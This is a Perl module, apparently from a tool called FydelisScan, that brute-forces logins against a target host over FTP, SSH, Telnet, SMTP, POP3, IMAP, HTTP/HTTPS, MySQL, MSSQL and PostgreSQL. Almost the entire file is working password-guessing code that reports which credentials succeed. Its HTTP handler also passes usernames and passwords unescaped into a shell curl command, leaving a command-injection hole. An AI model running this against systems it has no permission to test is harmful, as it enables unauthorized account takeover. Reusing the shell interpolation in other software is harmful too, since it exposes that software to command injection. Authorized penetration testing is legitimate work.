package FydelisScan::BruteFork;
use v5.20;
use strict;
use warnings;
use Moo::Role;
use IO::Socket::INET;
use IO::Select;
use Try::Tiny;
use MIME::Base64 qw(encode_base64);
use Time::HiRes qw(usleep);

requires qw(config logger shutdown);

# ── Handler central ────────────────────────────────────
sub try_credentials {
    my ($self, $port_info, $user, $pass) = @_;

    my $service = $port_info->{service};
    my $handler = "_brute_$service";

    # Se não temos handler específico, tentar fallback genérico
    if (!$self->can($handler)) {
        $self->logger->debug("Nenhum handler para '%s' na porta %d",
            $service, $port_info->{port});
        return 0;
    }

    return $self->$handler($port_info, $user, $pass);
}

# ============================================================
# HANDLERS POR SERVIÇO
# ============================================================

sub _brute_ftp {
    my ($self, $info, $user, $pass) = @_;

    try {
        my $sock = $self->_connect($info->{port}, $self->config->brute_timeout)
            or return 0;

        my $banner = $self->_read_line($sock, 3);

        $sock->send("USER $user\r\n");
        my $resp1 = $self->_read_line($sock, 3);
        return 0 unless defined $resp1 && $resp1 =~ /^3\d\d/;

        $sock->send("PASS $pass\r\n");
        my $resp2 = $self->_read_line($sock, 3);

        $sock->close();
        return defined $resp2 && $resp2 =~ /^2\d\d/;
    } catch {
        $self->logger->debug("FTP brute error: $_");
        return 0;
    };
}

sub _brute_ssh {
    my ($self, $info, $user, $pass) = @_;

    try {
        require Net::SSH::Perl;
        my $ssh = Net::SSH::Perl->new(
            $self->config->host,
            Port    => $info->{port},
            Timeout => $self->config->brute_timeout,
        );
        $ssh->login($user, $pass);
        return 1;
    } catch {
        return 0;
    };
}

sub _brute_telnet {
    my ($self, $info, $user, $pass) = @_;

    try {
        require Net::Telnet;
        my $tn = Net::Telnet->new(
            Host    => $self->config->host,
            Port    => $info->{port},
            Timeout => $self->config->brute_timeout,
            Prompt  => '/[>#$%] $/i',
        );
        $tn->login($user, $pass);
        return 1;
    } catch {
        return 0;
    };
}

sub _brute_smtp {
    my ($self, $info, $user, $pass) = @_;

    try {
        my $sock = $self->_connect($info->{port}, $self->config->brute_timeout)
            or return 0;

        my $banner = $self->_read_line($sock, 3);

        # AUTH LOGIN
        my $auth = encode_base64("\0$user\0$pass", '');
        $sock->send("AUTH LOGIN\r\n");
        $self->_read_line($sock, 3);

        $sock->send(encode_base64($user, '') . "\r\n");
        $self->_read_line($sock, 3);

        $sock->send(encode_base64($pass, '') . "\r\n");
        my $resp = $self->_read_line($sock, 3);

        $sock->close();
        return defined $resp && $resp =~ /^2\d\d|^3\d\d/;
    } catch {
        return 0;
    };
}

sub _brute_pop3 {
    my ($self, $info, $user, $pass) = @_;

    try {
        my $sock = $self->_connect($info->{port}, $self->config->brute_timeout)
            or return 0;

        my $banner = $self->_read_line($sock, 3);

        $sock->send("USER $user\r\n");
        my $r1 = $self->_read_line($sock, 3);
        return 0 unless defined $r1 && $r1 =~ /^\+OK/;

        $sock->send("PASS $pass\r\n");
        my $r2 = $self->_read_line($sock, 3);

        $sock->close();
        return defined $r2 && $r2 =~ /^\+OK/;
    } catch {
        return 0;
    };
}

sub _brute_imap {
    my ($self, $info, $user, $pass) = @_;

    try {
        my $sock = $self->_connect($info->{port}, $self->config->brute_timeout)
            or return 0;

        my $banner = $self->_read_line($sock, 3);

        $sock->send("a001 LOGIN $user $pass\r\n");
        my $resp = $self->_read_line($sock, 5);

        $sock->close();
        return defined $resp && $resp =~ /^a001 OK/i;
    } catch {
        return 0;
    };
}

sub _brute_http {
    my ($self, $info, $user, $pass) = @_;
    return $self->_brute_http_base($info, $user, $pass, 0);
}

sub _brute_https {
    my ($self, $info, $user, $pass) = @_;
    return $self->_brute_http_base($info, $user, $pass, 1);
}

sub _brute_http_base {
    my ($self, $info, $user, $pass, $ssl) = @_;

    my $scheme  = $ssl ? 'https' : 'http';
    my $uri     = "$scheme://$self->{config}{host}:$info->{port}/";
    my $timeout = $self->config->brute_timeout;

    my $output = `curl -s -o /dev/null -w "%{http_code}" \
        --max-time $timeout \
        --connect-timeout $timeout \
        -u "$user:$pass" \
        "$uri" 2>/dev/null`;

    return defined $output && $output ne '' && $output != 401 && $output != 403;
}

sub _brute_mysql {
    my ($self, $info, $user, $pass) = @_;

    try {
        require DBI;
        require DBD::mysql;
        my $dbh = DBI->connect(
            "DBI:mysql:host=$self->{config}{host};port=$info->{port};mysql_connect_timeout=$self->{config}{brute_timeout}",
            $user, $pass,
            { PrintError => 0, RaiseError => 1 },
        );
        $dbh->disconnect() if $dbh;
        return 1;
    } catch {
        return 0;
    };
}

sub _brute_mssql {
    my ($self, $info, $user, $pass) = @_;

    try {
        require DBI;
        require DBD::Sybase;
        my $dbh = DBI->connect(
            "DBI:Sybase:host=$self->{config}{host}:$info->{port}",
            $user, $pass,
            { PrintError => 0, RaiseError => 1 },
        );
        $dbh->disconnect() if $dbh;
        return 1;
    } catch {
        return 0;
    };
}

sub _brute_postgres {
    my ($self, $info, $user, $pass) = @_;

    try {
        require DBI;
        require DBD::Pg;
        my $dbh = DBI->connect(
            "DBI:Pg:host=$self->{config}{host};port=$info->{port}",
            $user, $pass,
            { PrintError => 0, RaiseError => 1 },
        );
        $dbh->disconnect() if $dbh;
        return 1;
    } catch {
        return 0;
    };
}

# ============================================================
# HELPERS DE CONEXÃO
# ============================================================

sub _connect {
    my ($self, $port, $timeout) = @_;

    my $sock = IO::Socket::INET->new(
        PeerHost  => $self->config->host,
        PeerPort  => $port,
        Proto     => 'tcp',
        Timeout   => $timeout,
    );

    return $sock;
}

sub _read_line {
    my ($self, $sock, $timeout) = @_;
    $timeout //= 3;

    my $sel = IO::Select->new($sock);
    return undef unless $sel->can_read($timeout);

    my $line = <$sock>;
    chomp $line if defined $line;
    return $line;
}

1;